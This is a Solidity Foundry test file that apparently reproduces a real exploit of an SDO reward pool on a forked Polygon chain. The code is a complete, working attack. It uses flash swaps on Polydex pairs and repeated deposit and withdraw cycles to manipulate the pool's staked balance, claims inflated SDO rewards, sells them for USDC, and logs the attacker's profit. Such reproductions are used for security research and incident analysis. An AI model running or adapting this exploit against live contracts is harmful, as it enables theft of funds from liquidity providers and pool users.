pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis

interface SdoRewardPOOL {
    function deposit(uint256 _pid, uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
    function harvestAllRewards() external;
    function updatePool(uint256 _pid) external;
    function pendingReward(uint256, address) external returns (uint256);
}

interface PolydexRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract depositToken {
    IERC20 SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    Uni_Router_V2 Router = Uni_Router_V2(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74);
    SdoRewardPOOL Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function depositPLX() external payable {
        address(WMATIC).call{value: 1 ether}("");
        address[] memory path = new address[](2);
        path[0] = address(WMATIC);
        path[1] = address(PLX);
        WMATIC.approve(address(Router), type(uint256).max);
        PLX.approve(address(Pool), type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WMATIC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        Pool.deposit(uint256(9), PLX.balanceOf(address(this)));
    }

    function withdrawPLX() external {
        Pool.withdraw(uint256(9), PLX.balanceOf(address(Pool)));
    }

    function sellSDO() external {
        address[] memory path = new address[](2);
        path[0] = address(SDO);
        path[1] = address(USDC);
        USDC.approve(address(Router), type(uint256).max);
        SDO.approve(address(Router), type(uint256).max);
        // require(SDO.balanceOf(address(this)) < type(uint112).max, "overflow");
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            // SDO.balanceOf(address(this)),
            20_000_000_000_000 * 1e18,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}

contract ContractTest is Test {
    IERC20 SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    Uni_Router_V2 Router = Uni_Router_V2(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74);
    SdoRewardPOOL Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0xD33992A7367523B04949C7693d6506d4a7e19446); // WETH PLX
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x948d4AE4e9Ebf2AC6E787D29B94d0fF440EF2e4D); // WMATIC PLX
    uint256 amounts0;
    uint256 amounts1;
    address addressContract;
    uint256 reserve0Pair1;
    uint256 reserve1Pair1;
    uint256 reserve0Pair2;
    uint256 reserve1Pair2;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("polygon", 16_225_172);
    }

    function testExploit() public payable {
        PLX.approve(address(Pool), type(uint256).max);
        WMATIC.approve(address(Router), type(uint256).max);
        (reserve0Pair1, reserve1Pair1,) = Pair1.getReserves();
        (reserve0Pair2, reserve1Pair2,) = Pair2.getReserves();
        address(WMATIC).call{value: 10_000 ether}("");
        // depost PLX
        ContractFactory();
        (bool success,) = addressContract.call{value: 1 ether}(abi.encodeWithSignature("depositPLX()"));
        //revert();
        require(success);
        // change block.timestamp
        cheats.warp(block.timestamp + 5 * 60 * 60);
        amounts0 = PLX.balanceOf(address(Pair1)) - 1 * 1e18;
        Pair1.swap(amounts0, 0, address(this), new bytes(1));
        // change block.timestamp
        cheats.warp(block.timestamp + 5 * 60 * 60 + 1);
        uint256 amountreward = Pool.pendingReward(uint256(9), addressContract);
        (bool success1,) = addressContract.call(abi.encodeWithSignature("withdrawPLX()"));
        require(success1);

        emit log_named_decimal_uint("Attacker SDO profit after exploit", SDO.balanceOf(addressContract), 18);

        (bool success2,) = addressContract.call(abi.encodeWithSignature("sellSDO()"));
        require(success2);
        WMATIC.balanceOf(address(this));

        emit log_named_decimal_uint("Attacker USDC profit after exploit", USDC.balanceOf(addressContract), 6);
    }

    function polydexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (msg.sender == address(Pair1)) {
            amounts1 = PLX.balanceOf(address(Pair2)) - 1e18;
            Pair2.swap(0, amounts1, address(this), new bytes(1));
            // flashswap callback pair1
            uint256 amountPLX0 = PLX.balanceOf(address(this));
            uint256 amountBuy = (amounts0 - amountPLX0) * 1011 / 1000 * 1000 / 995;
            buyPLX(amountBuy);
            PLX.transfer(address(Pair1), PLX.balanceOf(address(this)));
            // exploiter repay WETH to pair, but i dont konw how get weth on ploygon, weth-wmatic lack of liquidity ,i choose to repay plx
            // uint PLXInPari1 = PLX.balanceOf(address(Pair1));
            // uint WETHInPair1 =  WETH.balanceOf(address(Pair1));
            // uint amountWETH =
            //     (reserve0Pair1 * reserve1Pair1 / ((PLXInPari1 * 1000 - (amountPLX0 * 2 * 995 / 1000)) / 1000) - WETHInPair1) * 1000 / 998;
            // buyWETH(amountWETH);
            // PLX.transfer(address(Pair1), amountWETH);
        }

        if (msg.sender == address(Pair2)) {
            //reduced lptoken
            while (PLX.balanceOf(address(Pool)) > 100) {
                uint256 amount = PLX.balanceOf(address(this));
                if (PLX.balanceOf(address(this)) * 5 / 1000 > PLX.balanceOf(address(Pool))) {
                    amount = PLX.balanceOf(address(Pool)) * 1000 / 5;
                }
                Pool.deposit(uint256(9), amount);
                Pool.withdraw(uint256(9), amount);
            }

            // flashswap callback pair2
            PLX.transfer(address(Pair2), amounts1 * 1000 / 995 + 1e18);
        }
    }

    function ContractFactory() public {
        address _add;
        bytes memory bytecode = type(depositToken).creationCode;
        assembly {
            _add := create2(0, add(bytecode, 32), mload(bytecode), 1)
        }
        addressContract = _add;
    }

    function buyPLX(uint256 amount) public {
        address[] memory path = new address[](2);
        path[0] = address(WMATIC);
        path[1] = address(PLX);
        Router.swapTokensForExactTokens(amount, WMATIC.balanceOf(address(this)), path, address(this), block.timestamp);
    }
}
